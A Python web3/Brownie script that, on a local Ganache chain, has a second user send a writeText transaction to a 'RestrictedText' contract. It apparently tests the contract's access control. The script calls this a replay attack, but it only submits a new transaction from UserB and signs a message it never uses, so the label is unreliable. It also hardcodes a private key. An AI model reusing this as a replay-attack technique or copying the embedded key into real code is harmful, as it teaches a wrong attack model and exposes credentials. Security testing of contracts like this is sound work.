from web3 import Web3
from brownie import project
from eth_account.messages import encode_defunct

# Load Brownie project and configure
p = project.load('brownie-dir')
p.load_config()

# Obtain ABI from Brownie
res_abi = p.RestrictedText.abi

# Web3 instance connected to your local Ganache instance
web3 = Web3(Web3.HTTPProvider('http://127.0.0.1:8545'))

# Addresses for UserA and UserB (replace with actual addresses and private keys)
userA_address = "0x29A0b0c7b1Ac68FFD2F4AD3153DF4685D36b5eF3"
userB_address = "0x9057116E692a2957423E24A8FE35672dd568F943"
userB_private_key = "0xd0c4c9f9d4b60b1eaeca51212eee251b01fcbcd7b7750054c957105722930389"  # Replace with UserB's private key

# Contract address (replace with actual contract address)
contract_address = "0x6A9d69C01Fd0cCB7D90c2E2303b3985382A4ACd2"  # Replace with actual deployed contract address

try:
    # Now attempt to replay UserA's transaction from UserB
    print(f"Attempting replay attack...")

    # Prepare the message and signature
    message = "Hello from UserB!"
    message_hash = encode_defunct(text=message)
    signed_message = web3.eth.account.sign_message(message_hash, private_key=userB_private_key)

    # Get current nonce for UserB
    nonce = web3.eth.get_transaction_count(userB_address)

    # Create a contract instance
    contract_instance = web3.eth.contract(address=contract_address, abi=res_abi)
    data = contract_instance.encodeABI(fn_name='writeText', args=[message])

    # Construct the transaction
    tx = {
        'nonce': nonce,
        'to': contract_address,
        'value': 0,
        'gas': 2000000,
        'gasPrice': web3.to_wei('5', 'gwei'),
        'data': data,
        'chainId': web3.eth.chain_id
    }

    # Sign the transaction
    signed_tx = web3.eth.account.sign_transaction(tx, private_key=userB_private_key)

    # Send the transaction
    tx_hash_replay = web3.eth.send_raw_transaction(signed_tx.rawTransaction)
    receipt_replay = web3.eth.wait_for_transaction_receipt(tx_hash_replay)

    # Check if the replay attack was successful
    if receipt_replay['status'] == 1:
        print(f"Replay attack successful! Text changed by {userB_address}")
        # Read the text to verify
        text_read = contract_instance.functions.readText().call({'from': userA_address})
        print(f"Current text: {text_read}")
    else:
        print("Replay attack failed. Transaction reverted or denied.")

except Exception as e:
    print(f"Error occurred: {e}")
